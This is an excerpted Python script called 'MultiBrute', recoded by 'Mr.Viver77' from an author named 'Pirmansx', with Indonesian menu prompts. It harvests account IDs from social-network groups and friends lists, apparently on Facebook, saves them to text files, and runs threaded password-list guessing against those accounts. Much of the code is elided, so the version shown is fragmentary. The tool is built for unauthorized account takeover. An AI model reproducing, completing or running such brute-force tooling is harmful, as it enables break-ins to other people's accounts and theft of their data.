...
def bacaData():
	...
	try:
		fid_bgroup = open(os.sys.path[0]+'/Grub.txt','r').readlines()
	except:pass
	try:
		fid_bteman = open(os.sys.path[0]+'/Tuman.txt','r').readlines()
	except:pass
def inputD(x,v=0):
	while 1:
		try:
...
def simpan():
	...
	if len(id_bteman) != 0:
		...
		try:
			open(os.sys.path[0]+'/Tuman.txt','w').write('\n'.join(id_bteman))
			tampil('\rp[!]Berhasil meyimpan \Tuman.txt')
		except:
			tampil('\rm[!]Gagal Meyimpan')
def buka(d):
...
class mt(threading.Thread):
    ...
    def run(self):
        ...
        if 'm_sess' in data.url or 'save-device' in data.url:
            ...
            self.a = 0
def crack(d):
	i = inputD('[?]Pake Password list/Manual [L/m] ',['L','M'])
	if i.upper() == 'L':
		while 1:
		...
		for i in D:
			...
			if len(i) != 0:
				crack0(d,i,0)
		i = inputD('[?]Mau coba lagi [Y/n] ',['Y','T'])
		if i.upper() == 'Y' or i.upper() == 'y':
			return crack(d)
		else:
			return menu()
	else:
...
def lanjutT():
	...
	if len(fid_bteman) != 0:
		...
		if i.upper() == 'L':
			...
			os.remove(os.sys.path[0]+'/Tuman.txt')
			fid_bteman = []
	return 0
def lanjutG():
	global fid_bgroup
	if len(fid_bgroup) != 0:
		...
		if i.upper() == 'L':
			...
			os.remove(os.sys.path[0]+'/Grub.txt')
			fid_bgroup = []
	return 0
...
def menu():
	tampil('''
\rh+--------------------------------------------------+
\rh| \rm __  __       _ _   _ \rb ____             _        \rh|
\rh| \rm|  \/  |_   _| | |_(_)\rb| __ ) _ __ _   _| |_ ___  \rh|
\rh| \rm| |\/| | | | | | __| |\rb|  _ \| '__| | | | __/ _ \ \rh|
\rh| \rm| |  | | |_| | | |_| |\rb| |_) | |  | |_| | ||  __/ \rh|
\rh| \rm|_|  |_|\__,_|_|\__|_|\rb|____/|_|   \__,_|\__\___| \rh|
\rh|\rb__________________________________________________\rh|
\rh|\rb=======+--_={\rkRecoded By Mr.Viver77\rb}=_----+========\rh|
\rh|\rb=======+----_={\rkAuthor By Pirmansx\rb}=_-----+========\rh|
\rh|__________________________________________________|
\rh|\rb Note : It's tools create by Pirmansx , I recode \rh |
\rh|\rb        This Tools For my Content :v Happy Use   \rh |
\rh|--------------------------------------------------\rh|''')
	tampil('''
\rh____________________________________________________
    \rb(\rh1\rb)\rp. Ambil Id dari Group
    \rb(\rh2\rb)\rp. Ambil Id dari Teman
\rh____________________________________________________
    \rb(\rh3\rb)\rp. KELUAR 
\rh____________________________________________________''')
	i = inputM('Brute ',[1,2,3])
	if i == 1:
		lanjutG()
		idgroup()
	elif i == 2:
